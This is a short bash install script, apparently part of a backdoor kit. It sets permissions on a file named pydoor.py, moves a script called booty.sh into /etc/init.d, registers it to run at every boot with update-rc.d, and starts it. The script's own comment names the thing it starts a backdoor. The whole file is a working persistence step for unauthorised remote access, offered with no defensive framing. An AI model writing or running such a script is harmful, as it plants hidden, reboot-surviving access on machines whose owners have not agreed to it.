#! /bin/bash

chmod 711 pydoor.py

#move booty.sh to /etc/init.d/ and create symlinks for reboot
mv booty.sh /etc/init.d
chmod 755 /etc/init.d/booty.sh
update-rc.d booty.sh defaults

#initially start backdoor
/etc/init.d/booty.sh start
